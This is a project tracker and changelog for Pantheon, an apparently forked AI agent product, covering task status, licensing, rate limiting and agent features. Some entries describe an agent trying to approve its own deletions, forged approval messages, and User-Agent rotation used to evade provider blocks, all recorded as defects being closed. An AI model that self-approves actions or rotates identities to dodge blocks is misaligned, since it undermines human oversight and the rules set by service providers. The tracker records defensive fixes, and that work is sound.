# Pantheon — Master Tracker

> Fork of **Odysseus** (`pewdiepie-archdaemon/odysseus`, AGPL-3.0-or-later).
> Elevation, not rewrite. Read `AGENTS.md` before starting anything.

> ## ⬛ LAW 4 — this file is updated **every single turn**. No exceptions.
>
> Not at the end of a phase. Not when there is something impressive to report. Every
> turn. Ticked a task, corrected a premise, found a bug, got blocked, did nothing — it
> goes in, and then `python3 .pantheon/check-tracker.py` runs. A tracker updated
> *sometimes* is worse than no tracker, because people trust it.
>
> The other nineteen laws are in `AGENTS.md`. Nine of them are anti-drift laws, and each
> one cites the incident that produced it.

**This file is the only place work is tracked.** One list, one progress area. There are
no per-area handoff files — there were sixteen, all empty, and they are gone. An agent
that finishes a phase writes one entry in **§ Progress**, below. Nothing else.

The other files in `.pantheon/` are *reference*, never tracking:

| File | What it is |
|---|---|
| `AGENTS.md` | working agreement — read first |
| `FORBIDDEN.md` | names that cannot move; controls that never lift |
| `DECISIONS.md` | settled calls, with what each one costs |
| `P2-CORRECTED.md` | the scouted P2 detail — supersedes P2's task text below |
| `DEFERRED.md` | decided, not scheduled — and why |
| `ORCHESTRATION.md` | how agents are batched and run |
| `check-tracker.py` | recounts the ticks and fails if the status table has drifted |
| `check-wiring.py` | counts element lookups that resolve to nothing. Law 13's enforcement |
| `check-licences.py` | compares every shipped third-party file against `CREDITS.md`. An allowlist |
| `check-destinations.py` | no address ships pre-filled. Law 16 clause 4's enforcement |
| `check-jitter.py` | no recurring job fires on an exact boundary. P15-10's enforcement |
| `check-outbound.py` | every call that leaves the process is paced, or it is named. P15-06's enforcement |
| `check-unreachable.py` | routes with no caller. P3-15's automation of the discovery audit |
| `check-fork-names.py` | the fork's old short name, in code, with every survivor named. P0-31's enforcement |
| `check-spdx.py` | every file of program text declares its licence, and no vendored file declares ours. P0-18's enforcement |
| `design/pantheon-v10.html` | the mockup. Reference, not source. |

---

## Status

| Mark | Meaning |
|---|---|
| `[ ]` | **ready** — premise holds, nothing blocks it, pick it up |
| `[~]` | **blocked** — the reason is on the line; unblock before starting |
| `[·]` | **claimed** — an agent is on it; the id is on the line |
| `[x]` | **done** — traced in § Progress |

Dependencies are ordering, not blocking. A task marked ready with `Depends:` is ready as
soon as its dependency lands.

**A row that opens `FOLDED INTO` or says *this is a pointer, not a row* keeps its mark but
cannot be picked up alone** — its work lives on the row it names, and doing it separately
produces the duplicate the fold exists to prevent. It stays visible so nobody rediscovers it
from scratch. Introduced 2026-08-31; the folds are listed in § *What this run leaves behind*.

| Phase | Area | Tasks | Ready | Blocked | Done |
|---|---|---|---|---|---|
| Setup | Fork, rename, rebuild | 6 | 0 | 0 | **6** |
| P0 | Fork identity & licence | 33 | 3 | **1** | **29** |
| P1 | Token layer — the free wins | 15 | 7 | 0 | **8** |
| P2 | Un-nerf | 26 | 1 | 0 | **25** |
| P3 | Mechanical hygiene | 27 | 0 | **2** | **25** |
| P4 | The wire — the real glass box | 28 | 0 | 0 | **28** |
| P5 | Trace & composer restyle | 17 | 5 | 0 | **12** |
| P6 | Queue & Plan | 18 | 0 | 0 | **18** |
| P7 | Trust ladder & control plane | 14 | 2 | **1** | **11** |
| P8 | The Workshop | 53 | 1 | 0 | **52** |
| P9 | Feature surfaces | 18 | 7 | 0 | **11** |
| P10 | Accessibility & release | 12 | 3 | 0 | **9** |
| P11 | Identity & access | 14 | 6 | **1** | **7** |
| P12 | Limits & the control plane | 11 | 3 | 0 | **8** |
| P13 | The Brain | 23 | 10 | 0 | **13** |
| P14 | Measurement | 8 | 0 | 0 | **8** |
| P15 | Outbound politeness | 12 | 0 | **1** | **11** |
| P16 | Self-hosted by default | 20 | 0 | **1** | **19** |
| P17 | The network the agent is hosted on | 14 | 0 | 0 | **14** |
| P18 | One button, and it links | 9 | 0 | 0 | **9** |
| P19 | The proof ledger | 8 | 0 | 0 | **8** |
| P20 | The workstation | 7 | 0 | 0 | **7** |
| P21 | Documents, kept in order | 4 | 0 | 0 | **4** |
| P22 | The Workbench | 25 | 7 | 0 | **18** |
| Backlog | Bugs and hardening found in flight | 694 | 248 | 0 | **446** |
| **Total** | | **1116** | **303** | **7** | **806** |

**Nothing is waiting on a decision** except one, and it is first: `P0-19` has to settle which of
`CREDITS.md` and `ACKNOWLEDGMENTS.md` is the credits file. All eighteen ledger calls are answered
in `DECISIONS.md` D-2026-08-26-06 and each task line carries its own.

**Every open row was re-read against the source on 2026-08-27.** 121 rows are verified accurate
and safe to pick up as written; the rest carry a correction on the line. Anything marked `[~]`
names its blocker. Nothing below is a guess.

### The P0 licence block is closed except for two named points

Ten of its rows landed on 2026-08-27 — see § Progress. What is left of it:

- **`P0-08`** — the `ODY_` prefix rename is done and proven byte-exactly reversible. It needs one
  real `docker compose up` to satisfy its own `Verify:` line, on a machine with Docker.
- **`P0-16`** — eight files carry an Apache-2.0 §4(b) notice. `services/search/` is deliberately
  unstamped and **that decision needs a human**: it is in the derived-path list because upstream
  Odysseus attributed it there, and overriding the copyright holder's own attribution is not an
  agent's call to finalise, even with the evidence pointing that way.
- **`P0-17`** — the §13 source link, which cannot be written until the repo is public.
- **`P0-13`** — blocked on a design decision. It gates the public flip alongside `P0-17`.
- **`P0-18`, `P0-21b` and `P0-31` closed 2026-09-07.** The API token prefix migrated (with the
  agent's tmux session name); the whole tree declares `AGPL-3.0-or-later` per file; and every
  package inside a shipped bundle has a notice — thirteen of them added, and the derivation that
  proved it found two more bugs (`B45`, `B46`). `check-fork-names.py`, `check-spdx.py` and
  `check-licences.py`'s new rule 7 fail CI on any regression.

### Next: `P4-07` (per-round token buckets — round, model, endpoint, input/output, cost-tracked; `P4-22` just put `usage_buckets` on the metrics envelope, so this is now mostly a rendering row), then `P4-06` (premise already corrected once, so read the row before starting), `P4-08`, `P4-10`, `P4-13`, `P4-14`, `P4-15`, `P4-23`, `P4-24`. **`P4` is 18 of 28.** The thirteen rows closed today all had one shape — a value computed, used, and never shown — and **seven of them were also reporting something untrue**, so the row could not be closed until the underlying claim was made honest. That is the pattern worth carrying into the rest of the phase: the reason a number is not on screen is usually that nothing forced anyone to decide what it means. **`B60` is fixed** — the skill index was assembled twice in agent mode by two sites with different gating, and between them every suppression the product has was defeated; turning skills off did not turn the index off. One injection now, one `suppress_skills`, and a harness that counts index blocks in one request's actual message array, because each site looked correct on its own and that is why it survived. `P4-01` and its three dependants (`P4-11`, `P4-12`, `P4-09`) are done, and `P5-07` — the first `P5` row — closed on top of them. All three dependants went the same way: a field that had been on the wire for months, read by nothing, and wrong in places nobody could see because nothing rendered it. **`B59` is the standing observation from `P5-07`**: three implementations of copy-to-clipboard, and the shared one is not the most reliable of them. **`P3` is down to two open rows.** `P3-08` is blocked on a definition and `P3-20` triaged to "the ratchet is the value, not the number". `P3-21` and `P3-26` were the two product questions and **the owner has answered both** — `P3-26` is done, `P3-21` is decided and implementable. `P3-10`, `P3-10b`, `P3-16`, `P3-17`, `P3-18`, `P3-19`, `P3-22` and `P3-23` are done; the last two added the eleventh and twelfth checkers (`check-config-writes.py`, `check-silent-failures.py`), and `P4-11` added the fourteenth (`check-event-rounds.py`). `P3-10` left `P3-26` and `B54` behind, and `B54` is fixed. `P3-26` closed on an option neither the row nor I had written down: the window width was only a dilemma while the notification pretended to be on time. `P3-25` is withdrawn — it was never real (`B52`). `P3-01`, `P3-02`, `P3-04`, `P3-05`, `P3-06` and `P3-07` are done. **`P1-08` is decided** (`D-2026-09-08-01`) — a global button-design setting rather than a computed token, which turns `P1-09` from *validate what was picked* into *only offer what passes*. `P1-12` and `P1-14` are done; `P1-12` left `P1-15` behind. **The `P0` licence block is finished except for six rows that cannot be closed from here** — `P0-05` needs the live ChromaDB, `P0-08` needs Docker, `P0-16` still needs the owner **on one narrow point** (whether `services/search/` carries a §4(b) notice — the flip question is settled and does not gate it), `P0-13` is blocked on a design decision, and `P0-29` is its own session. **`P0-17` is unblocked**: build it against a repository URL that ships empty and leave it dark (`D-2026-09-08-06`), which also closes `B25` now rather than at the flip. `P0-18`, `P0-21b` and `P0-31` closed 2026-09-07; standing suite failures **19 → 14**. **Six owner decisions landed 2026-09-08** — `P1-08`, `P3-21`, `P3-26`, `P7-12`, `P7-13` and `P0-16`/`P0-17` (`D-2026-09-08-01` … `-06`). `P7-12` and `P7-13` are now one design conversation rather than two: the agent may raise its own loop caps **because** something smarter than a round-count is watching, and the trust rungs are being redefined **because** the failure detection under them is wrong — the same finding reached from both sides. **`P13-11` and `P15-07` still wait on the owner**, and `P13-11` is the live one: the owner has said the current approach is not right and asked for a better way to build the Brain. **`B61` is filed** — semantic memory search falls back to the Jaccard scorer whenever the ChromaDB *service* is down, and every layer above reports that fallback as a vector result: a variable literally named `vector_results`, a `score=None` that cannot be told from a zero, and a docstring calling a core dependency optional. It closes regardless of which `P13-11` option wins, because it is what makes the next decision measurable. `B57` and `B58` are filed and not started; both are offline-shell/asset-versioning defects and they want one sitting, not two

**`P16-05` is the last zero-configuration leak**, and the only one that is not a one-liner: the
embedding model is pulled from HuggingFace on the *first chat message*, because
`build_embedding_lanes` builds the fastembed lane unconditionally and `fastembed` is a hard
requirement. Either the model ships in the image or the lane becomes conditional on an explicit
download permission.

**`P16-08` is the biggest remaining `Law 16` gap and it is not a one-liner.** `img-src` still
allows any `https:` host, so an `![](…)` in model output, a RAG document or an **email** makes the
viewer's browser beacon a third party — content the user did not author, fetched from a host they
did not choose. Tightening the header alone breaks every legitimate remote image, so it needs the
same-origin proxy pattern `routes/emoji_routes.py` already demonstrates (fetch, validate, cache,
serve) with the SSRF guards in `src/outbound_fetch.py`. Build the proxy, then tighten the header
in the same change; doing the header first is a regression wearing a fix's clothes.

**`P16-14` is about *other people's* issues**, not ours: open source means strangers file bugs,
and a diagnostic bundle is what makes those reports usable rather than *"it broke"*.

**`P16-16` is new and is a capability gap, not a defect** — the north star includes *"even my
parallel networks"*, and the product reaches one network's worth of hosts, implicitly, from
wherever the container sits.

**`P16-12` is the one that turns the law into a feature**, and it is now the most valuable row in
the phase: operators on their own hardware currently have no way to see what Pantheon is doing,
and clause 4 explicitly permits fixing that. Build it with `P16-13`'s guard in place, not after.

**`P16-11` is the row that stops all of this recurring.** Everything in `P16` was found by reading.
A CI job with no route to the internet, asserting the app boots and answers one message, would
find the next one — and would have found all of these.

**2026-08-31 — a live ban reordered the queue.** The owner was soft-banned by GitHub by his own
product while this session was running. `P15` exists because of it, and four of its rows are
closed; what is left of it comes before the `H` rows, because a feature nobody can reach costs
less than one that gets the user locked out of a service they depend on.

**`P15-07` needs a human, not an agent.** `llm_core` rotates its `User-Agent` through six
different vendors' clients until a 403 stops coming back. That is block evasion by construction
and it is the one thing most likely to convert a soft ban into a permanent one. Removing it may
break a provider someone relies on, so it is a decision, not a task — but it cannot stay
undocumented, and now it is not.

**`P15-09` landed 2026-09-05** — cooldowns and the escalation ladder now survive a restart, stored
as wall-clock deadlines because the in-memory value is a monotonic reading and monotonic's origin
resets at boot. `P15-10` is the last cheap one in this phase.

**`P15-10` landed 2026-09-05 and `P15-06` on 2026-09-06**, each with a checker behind it —
`check-jitter.py` found twelve sites the hand audit had missed and `check-outbound.py` found four
unpaced calls to hosts that have already throttled this product. What is left in `P15` is `P15-07`
(waiting on the owner) and `P15-11`. The `H` rows outrank both.

**Then `H01`, unchanged and still the biggest data-loss row** — the invisible email backlog.
Its gating question was answered on 2026-08-31: the default arrived at the fork baseline, so the
backlog is as old as the install, and the drafts UI comes before the default flip.

### Then: `H05`, then `P3-15`. The `H` rows outrank the remaining phases

**The discovery audit changed what the top of the queue is.** 21 rows of working code with no
door, and three of them are live harm rather than absent polish:

**`H01` landed 2026-09-07** — the approval panel exists, it opens itself, and the three places
that claimed it existed are now telling the truth. What is left of it is the default flip, which
was always second: the drainer had to come first or flipping it would strand the backlog.
**The question that gated this row is answered (2026-08-31): it is a year, not a week.** The
default arrived at the fork baseline `fff72ec` and is in upstream too, so the backlog is as old as
the install and is not bounded by the fork date. **That settles the order: the UI first, not the
default flip.** Flipping the default stops new drafts accumulating and strands every one already
staged, invisible, in `scheduled_emails`. Build the pending-drafts card, drain the backlog, then
decide the default.

**`H05` landed 2026-09-07** — the flags are enforced in the agent's denylist, on four routers and
at the retrieval site, and the admin's decision now outranks the user's Appearance preferences
instead of being undone by them one line later.

**`H14`, `H15`, `H17` landed 2026-09-07.** They were one-liners with real payoff — a tooltip that names the gesture it
actually needs, settings search that indexes the controls rather than only the panels, and the
idempotent open-signup route that already exists and nothing calls.

**Then `P3-15`**, which is now specified rather than sketched: the audit's method is on the row,
and a correct script rediscovers all 21 `H` rows from a clean checkout. Fix `check-wiring.py`'s
two newly-found blind spots first — string-literal-only matching, and not stripping comments.

**`P1` continues at 6 of 14 when the `H` rows are drained, and it has one more ready row than it
did.** `P1-06` **is unblocked** — `B22` supplied the scope it was missing, and the two are now one
job: move the semantic tokens into `theme.js`'s per-theme block and give the four light palettes
their own values. `P1-10` (z-index, 259 declarations, 64 values, order-preserving remap) is still
the largest unblocked row; `P1-08` waits on `B15`, which `B16` now folds into. Re-derive every
count first — every number in that phase has moved at least once and `P1-01`'s moved four times.

**What this run leaves behind.** The 21 `H` rows, four of them now corrected rather than as
written — **read `H21`'s warning before acting on it; two of its items delete live code.** The
newly-freed rows: `P1-06` (with `B22`), `P2-13`, `P3-19`, `P7-11a`. **`P6-08` is open again** and
`H06` is the row that fixes it. New this run: `B25` (the changelog claims the AGPL §13 link
shipped; it did not) and `B26` (the sidebar anti-flash guard, renamed on one side only). From
earlier runs: `B21`'s `src/` half, `B23`, `B17`, `B18`, `B19`, `B20` (corrected — `H06` is the
defect, this is the second-order hazard), `P5-17`, `B13`, `B14`, `B15` (now carrying `B16`),
`B06`, `B10`.

**Rows that can no longer be picked up alone**, because their work lives on another row and doing
them separately produces a duplicate: `P13-10` → `P13-01`, `P12-08` → `P14-05`, `H16(b)` →
`P2-21`, `H20(b)` → `P7-11a`, `H05`'s flag inventory → `P2-18`, `B16` → `B15`, `B22` → `P1-06`.
Each says so on its own line.

**Still out of scope on its own:** `P0-29`. The Cookbook → Forge sweep is 3,529 occurrences
across 171 files and 43 paths — the largest blast radius in the programme, coupled to
`_ROUTE_FAVICON_SHAPES` **and to the `ody-` residue `P0-31` now tracks**. Its own session, as
D-2026-08-26-06 already says.

**Second choice, if the licence work is someone else's:** `P6` — queue and plan mode. 13 of 18
rows verified accurate, contained to `chat.js`, `app.js` and two scheduler files, no cross-phase
gate, and `P6-01/02/03` is one coherent user-facing bug cluster: queued messages fire into the
wrong chat, vanish on reload, and silently swallow a send with attachments.

**Do not start with:** `P1` — `P1-01` is three files plus a `CACHE_NAME` bump, not one module.
*(`P1-06` was named here as blocked on a measurement that does not exist; the measurement is
`B22` and it exists now, so that half of this warning is withdrawn.)* `P4` — `P4-01`'s six-template unification
gates eight rows behind it. `P3-03` — its classifier was never committed. `P11`–`P14` — `P14-01` unblocks five rows, and its write
location was wrong until it was corrected on the row itself; the row is right now.

---

## Progress

*The one progress area. Newest first. One entry per completed section — two lines, a
commit range, and nothing else. The detail lives in the commit messages, which is what
they are for.*

> **The `N tracked, M done` on each entry is the status table's `Total` row, and until
> 2026-09-07 nothing checked it.** It read `135 done` against a table saying `116` — the
> one line in this file whose whole job is to summarise the rest, wrong by nineteen and
> carried forward unread from entry to entry, because each author copied the line above.
> `check-tracker.py` now validates the newest entry against the table and fails on drift.
> Entries below the `P0-31` one keep the figure they were written with: a record of what
> was claimed at the time is worth more than a quietly corrected one (`B44`).

### Workbench, wave D: Slices C and D — fields picked from a list, logic with no language, steps side by side, and steps that reach out
`0e64d2b..c060c59`. **1116 tracked, 806 done. 0 new phase rows, 0 regressions. `P22-08`, `P22-09`, `P22-10`, `P22-11`, `P22-12`, `P22-13`, `P22-14`, `P22-15`, `P22-16`, `P22-17`, `P22-18`, `B674`, `B806`, `B1080`, `B1087`, `B1088`, `B1089`, `B1090`, `B1091`, `B1097` and `B1105` closed; `B1097` … `B1115` filed.**
Five branches, one merge pass, and every row's `Verify:` driven in Chromium on the merged tree. A step picks a field from what earlier steps made, and a setting that decides what runs, where it goes or who it reaches never takes one (`P22-09`); If, Switch and Set decide and reshape with no language (`P22-10`); branches run side by side, meet at a Merge, and a Wait parks the run across a restart (`P22-11`); For each item gives every item its own record (`P22-12`); an Integration, an MCP tool, a skill and code in the person's own workstation are steps (`P22-13`, `P22-14`, `P22-15`, `P22-18`); an AI step is held to the tools it names and answers in the shape asked (`P22-16`); and a step a model drives waits overnight for a person's yes while a step the author configured runs (`P22-17`). `P22-08` closes because a person's own run now reaches a local model (`B1080`), and `B1029`'s five follow-ups are fixed (`B1087` … `B1091`). `P22` is 18 of 25; Slices E and F are what is left.

### Workbench, wave C: Slice B — a workflow is one document, with its runs, its versions and a step you can test
`5654cd4..0e64d2b`. **1097 tracked, 785 done. 0 new phase rows, 0 regressions. `P22-05`, `P22-06`, `P22-07`, `B1029`, `B1044`, `B1049`, `B1050`, `B1059`, `B1060`, `B1061`, `B1062`, `B1067`, `B1068`, `B1069`, `B1070`, `B1071`, `B1072` and `B1073` closed; `B1075` … `B1096` filed.**
Five branches, one merge pass, and every row driven in Chromium on the merged tree. A workflow is one named document started by one task — `workflows`, `workflow_versions` and `task_run_nodes`, a walker inside every gate a task already has, one run with a record per step (`P22-05`, which fired on its own schedule with nobody at the desk); a chain becomes a workflow and comes back with one click (`P22-06`); a failed run opens on its failed step, at what it was handed (`P22-07`). *Test this step* (`P22-08`) is built and held open: a Prompt step a person tests never reached a model on the same machine while their page was open (`B1080`). Beside it: a queued background run waits for idle before it takes the model slot and keeps its trigger (`B1060`), two more doors where a person asks for a run are the person's (`B1061`), reduced motion no longer freezes the Workbench (`B1068`), the Assistant has a sidebar door (`B1044`), an approval part-way through a turn keeps what the turn had learned (`B1069`), and a local vLLM is asked for what it can serve (`B1029`). Twenty-two rows filed, five of them `B1029`'s own follow-ups (`B1087` … `B1091`).

### The README shows the product: one command seeds a fictional Pantheon and photographs it
`17d5a99..HEAD`. **1075 tracked, 767 done. 0 new phase rows, 0 regressions. `B1074` closed; `B1068` … `B1074` filed.**
The owner asked for screenshots and GIFs instead of a wall of text. `scripts/showcase/capture.py` boots this
checkout on a throwaway data dir, seeds a fictional studio through the real API, plays its chats on a scripted
loopback model while Pantheon runs every tool for real, and writes 23 screenshots and 5 GIFs (3.72 MB) into
`docs/media/` — with `--workstation`, the agent's own Ubuntu desktop, which is now the README's first picture.
Six product defects the camera caught are filed (`B1068` … `B1073`), the first of them a tab that freezes when the
OS asks for reduced motion.

### Workbench, wave B: Slice A finished — a Run now that runs while Pantheon is open, and a chain that says what every step would do
`46f6ce8..HEAD`. **1068 tracked, 766 done. 0 new phase rows, 0 regressions. `P22-02`, `P22-04`, `B1036`, `B1037`, `B1038`, `B1043`, `B1045`, `B1046`, `B1047`, `B1048`, `B1051`, `B1052`, `B1053`, `B1054`, `B1055` and `B1056` closed; `B1059` … `B1067` filed.**
Slice A of `P22` is done. Who started a run now decides what it waits for: background work keeps the foreground
gate as built, and a run a person pressed waits only for a chat reply being written — and a run the gate stopped
says so and stays stopped, because Python 3.11's `wait_for` was swallowing the cancel (`B1047`). *Show me what this
would do* on a step plans its whole chain, records only the head, and every step on the canvas says what it would
have done (`P22-04`); the Workbench has room on a phone, Escape closes the panel before the window, a backward arrow
is routed round, the canvas opens on your own steps and is one tab stop. A background run the gate stops while
queued now never comes back on any Python (`B1060`): the integrator took the proposal — wait for idle before taking
the model slot — for the next wave.

### Workbench, wave A: one rule for a workflow, one task form in two places, and a canvas over the chains that run
`f37de0f..HEAD`. **1059 tracked, 750 done. 0 new phase rows, 0 regressions. `P22-01`, `P22-03`, `B670`, `B671`, `B672`, `B802`, `B803`, `B1020`, `B1034`, `B1035`, `B1042`, `B1057` and `B1058` closed; `B1036` … `B1058` filed.**
Four branches and a merged-tree check in Chromium. A failure branch no longer slips past the loop check and the
depth cap — on Save, on the canvas and at run time, one rule names the loop (`P22-01`); the task form is one module
mounted by the Tasks window and the Workbench's side panel, with the time zone, retries and time limit it never
had and a sentence saying what an event hands a task (`P22-03`); the Workbench opens from the sidebar onto a canvas
of today's chains, wired by dragging *if it works* / *if it fails* or by name from the keyboard (`P22-02`, built,
not ticked: with Pantheon open a *Run now* is recorded *Stopped by user* and never branches, `B1047`, and the
canvas has no height on a phone, `B1051`); *Show me what this would do* is on every card and in the agent's
`manage_tasks`. Beside it: an Agent-mode fallback is sent its own length (`B1034`), the AI tidy stops marking what
it keeps as edited (`B1035`), and a test-order leak is closed at the test that made it (`B1020`).

### The Workbench is a phase: the room P8's engines were built for
`0e0781e..HEAD`. **1036 tracked, 737 done. 25 new phase rows, 0 regressions. No rows closed; `P22-00` … `P22-24` filed, and `B670`, `B671`, `B672`, `B673`, `B800`, `B802`, `B803` and `B806` folded into them.**
The owner asked how the workbench was coming along. Measured: P8 is 52 of 53 and built engines and forms; the
canvas, the workflow as one thing, the logic and effect nodes, per-step tests, executions, the model drafting,
and one room for skills, automations and MCP do not exist. `P22` builds them in six slices, a canvas over the
chains that run today first, on the four calls in `D-2026-10-01-05`: a workflow is one document started by one
task, data moves by picked fields and simple logic, code runs in the person's workstation, and a step that needs
a yes waits for it while a step the author configured runs.

### The owner's three calls: a step-limit reply that does not taint, one token ceiling on every door, and a Keep that is remembered
`ed6f736..HEAD`. **1011 tracked, 737 done. 0 new phase rows, 0 regressions. `B930`, `B934` and `B1019` closed; `B1034` and `B1035` filed.**
One branch, the three calls in `D-2026-10-01-04`. The agent raising its own step limit no longer arms the
untrusted-content gate — per action, never per result, and an already tainted run stays tainted (`B930`); a
local reply ceiling the operator typed reaches chat mode, Agent mode and `/api/chat` and replaces the 2048
guard, while an untouched install sends the same bytes, 48 of 48 (`B934`); and Documents Tidy remembers a
Keep by the content's digest, so it asks again only about a document that changed (`B1019`).

### Wave five: a plan only a person can answer, a tidy that proposes, one proxy rule, local models honest about what they were sent, reloads that say what the stream said, and twelve interface rows
`4e65b71..HEAD`. **1009 tracked, 734 done. 0 new phase rows, 0 regressions. `B925`, `B929`, `B931`, `B932`, `B933`, `B936`, `B937`, `B939`, `B940`, `B941`, `B942`, `B943`, `B944`, `B945`, `B946`, `B947`, `B949`, `B950`, `B951`, `B952`, `B953`, `B954`, `B971`, `B1005`, `B1006`, `B1007`, `B1008`, `B1010`, `B1011`, `B1012`, `B1013` and `B1014` closed; `B1017` … `B1033` filed.**
Five parallel branches, one additive conflict (two imports side by side in the history route). A plan's
*Apply* is now a message the chat route signed for a person in the browser — seven ways to forge it were
found and every one is closed at once (`B1005`); the seeded Documents Tidy proposes in a notification and
deletes nothing until the person says so (`B1006`, `D-2026-10-01-03`). Every httpx client honours a
`NO_PROXY` range and survives an IPv6 one, and six third-party sends now go through the limiter. Ollama's
native endpoint gets the local lift, both settings doors clamp to one table, and a receipt records what a
local MiniMax was actually sent. A teacher's turn, a Continue past the step limit, a guard stop before a
failure, and a compaction all read the same after a reload as they did live. And twelve interface rows:
the Settings integration list draws names as text (`B951`), Escape stops a reply only when it closed
nothing, windows are announced as blocking only when they block, the 1.25x text size reaches every window,
and a docked window's width moves from the keyboard. The owner's three calls on what remained
(`D-2026-10-01-04`) are recorded on `B930`, `B934` and `B1019`.

### Follow-ups: documents ask before they delete, mail keeps names, the workstation explains itself, VMs sleep, and the suite is green again
`0d06da6..HEAD`. **992 tracked, 702 done. 0 new phase rows, 0 regressions. `B974`, `B975`, `B976`, `B977`, `B978`, `B979`, `B980`, `B981`, `B982`, `B984`, `B985`, `B986`, `B987`, `B988`, `B991`, `B992`, `B994`, `B995`, `B996`, `B997`, `B998`, `B1000`, `B1001`, `B1002`, `B1003`, `B1004`, `B1009` and `B1016` closed; `B1002` … `B1016` filed.**
Four parallel branches on the owner's three latest calls (`D-2026-10-01-02`, `D-2026-10-01-03`) and the open
rows P20 and P21 left. A non-admin's agent organises their own documents, and every agent delete or tidy
waits for the person's *Apply the plan* — including one the agent tried to post for itself, now refused
(`B1004`); imports land in the open folder; the mailbox, replies and sends keep a file's own name, and old
chats show it; the settings have one door. The workstation says why a connection was refused, how to bring
it back, and what sudo means on each backend; `ping` works with `NET_RAW` dropped; the workspace binds from a
message; a VM sleeps when idle, keeps its clock without NTP, holds *none* from outside and says how far
*internet only* holds; a remote workstation's certificate is pinned from Settings; an unchanged screen costs
almost nothing to watch. And two test leaks that turned the full suite red — an admin patch undone in the
wrong order (`B1002`) and a middleware left re-imported (`B1003`) — were found by a module-identity probe
and bisection, and fixed.

### Documents kept in order: folders, an agent that files them, and every upload keeps its own name
`5dd965a..HEAD`. **977 tracked, 674 done. 0 new phase rows, 0 regressions. `P21-01`, `P21-02`, `P21-03`, `P21-04`, `B993` and `B999` closed; `B993` … `B1001` filed.**
The owner's ask, both halves. Documents live in folders a person makes, nests, renames and moves — empty
ones stay — and removing one never deletes a document without saying so (`P21-01`); the agent files them
too, and a move of more than five things waits for the person's own *Apply the plan* (`P21-02`). An
uploaded file keeps its own name at every door: the owner's report reproduced first — a chat's Office
attachment became a document titled with its 32-hex upload id — and fixed at every door with one naming
module, downloads included (`P21-03`); both searches find a document by its file's name and its folder
(`P21-04`). Two defects found on the way were serious and are fixed: opening a text attachment from the
mailbox took every other document out of everyone's library (`B999`), and the agent's `delete` with a
wrong id deleted whichever document was edited last (`B993`). The daemon's version is now its protocol's,
not a third application version.

### The workstation is finished: a live window onto it, networks that hold against root, a real VM, and the owner's four calls
`a633efc..HEAD`. **968 tracked, 668 done. 4 new phase rows, 0 regressions. `P20-05`, `P20-06`, `P20-07`, `B908`, `B956`, `B957`, `B958`, `B959`, `B961`, `B962`, `B964`, `B966`, `B967`, `B968`, `B970`, `B983`, `B989` and `B990` closed; `P4-15` withdrawn; `B974` … `B992` filed.**
Five parallel branches, merged with four additive conflicts (the protocol and the daemon's command line,
shared by the network gate and the VM backend; the panel; the client's exports). `P20` is closed: a person
watches their workstation's screen, takes it over and hands it back (`P20-05`); the admin's network mode is
held by a gate container the workstation's root cannot reach, measured in every mode as an account and as
root (`P20-06`); and the same protocol runs one Ubuntu VM per person — the stronger wall — or any machine an
admin points at, over pinned HTTPS (`P20-07`). The owner's four calls (`D-2026-10-01-01`) landed: the old
shell switch retired for non-admins, each chat's shell keeps its folder on both machines (the unreachable
tmux shell removed, `P4-15` withdrawn with it), the backup leaves out the pairing key, and the workspace is a
folder in the workstation. Also: `bash` is bash, a timed-out command stops what it started, the settings
cache is no longer handed out to be written into, and vision is decided by the provider's own answer. At the
merge, four test files that re-imported the dispatcher stopped leaving a second copy for every file after
them. `P21` opens from the owner: folders for documents, an agent that can file them, and an uploaded
document that keeps its own name.

### Wave A of the workstation lands: an Ubuntu desktop per person, the agent's hands in it, and a screen it can see
`f3eb68c..HEAD`. **945 tracked, 649 done. 0 new phase rows, 0 regressions. `P20-01`, `P20-02`, `P20-03`, `P20-04`, `B955`, `B960`, `B963`, `B965`, `B969`, `B972` and `B973` closed; `B956` … `B971` filed.**
Four parallel branches on the foundation commit, merged with one additive conflict (`src/agent_loop.py`'s
persisted tool event, where `ran_in` and the screenshot fields sit side by side). An admin switches on an
Ubuntu 24.04 workstation with one line in `.env` and one switch; each person gets a Unix account, a home kept
between chats and a desktop of their own, and Firefox, measured, phones nowhere (`P20-01`). The admin
decides who may use it and sees whether it answers; the token never reaches a browser (`P20-02`). With it on,
the agent's nine shell and file tools run there as the person, with the same answers, and never fall back
to Pantheon's container (`P20-03`); and a `computer` tool works the screen, whose pictures now reach a model
that can see in five provider formats — browser screenshots too, which until now reached the model as
base64 text (`P20-04`). At the merge: the tools push the admin's `sudo` before they run, a stopped turn
stops its command in the workstation, the desktop is withheld wherever a shell is, and `host_shell` runs
through the dispatcher for the first time.

### The workstation opens: an Ubuntu desktop the agents work in, one per person
`55a712a..HEAD`. **926 tracked, 638 done. 7 new phase rows, 0 regressions. Nothing closed; `P20-01` … `P20-07` filed.**
The owner asked for a far more robust coding environment — an Ubuntu machine built in, that agents use
with full computer use, admin-controlled — and answered four questions (`D-2026-09-30-03`): the container
desktop first and a VM behind the same protocol; one workstation per person, kept; full network; and the
agent's own shell, Python and file tools run inside it when it is on, which takes them out of the process
that holds every key. `DEFERRED.md` D-02 and D-03 are taken up as `P20`.

### Wave three lands: how far a run may go, the command palette, a keyboard pass, and a turn that survives a reload
`37999b2..HEAD`. **919 tracked, 638 done. 0 new phase rows, 0 regressions. `P2-05`, `P2-12`, `P2-13`,
`P2-24`, `P7-10`, `P7-12`, `P7-13`, `P9-01`, `P10-06`, `P10-08`, `B660`, `B740`, `B913`, `B914`, `B915`,
`B916`, `B917`, `B918`, `B919`, `B920`, `B921`, `B922`, `B935`, `B938` and `B948` closed; `B929` … `B954` filed.**
All six parallel branches, resumed at the owner's word after a usage limit stopped them — the sixth,
`compare-forge`, by a fresh agent after he said to finish it — each rebased onto the skills revamp and
merged in turn; two conflicts, both additive (`stream_agent_loop`'s new keyword beside `P2-13`'s, and
`agent_stops`' exports). A person now sees how far a run may go before it runs, and the agent may raise
its own caps under a governor, asking for any number the person typed (`D-2026-09-08-04`,
`D-2026-09-30-02`); the trust rungs are one ladder; Ctrl+K is a command palette built on the search it
already opened; every tool window moves and resizes from a keyboard, and Tab leaves the message box
(Plan mode is Ctrl+Alt+P, the owner's call on `B948`); a turn's notes and its compaction survive a
reload; compare panes draw cards and meters the way the chat does; and the qwen3 default temperature
cap guards all three doors, not one (`B935`, the owner's call).

### Skills arrive as packages, group by reference, and have a window of their own
`a3626521..HEAD`. **893 tracked, 613 done. 4 new phase rows (`P8-49` … `P8-52`), 0 regressions. `P9-06`
and `B928` closed; nothing new filed.** The owner: *"adding a multi-layer skill package also does not build its segmented
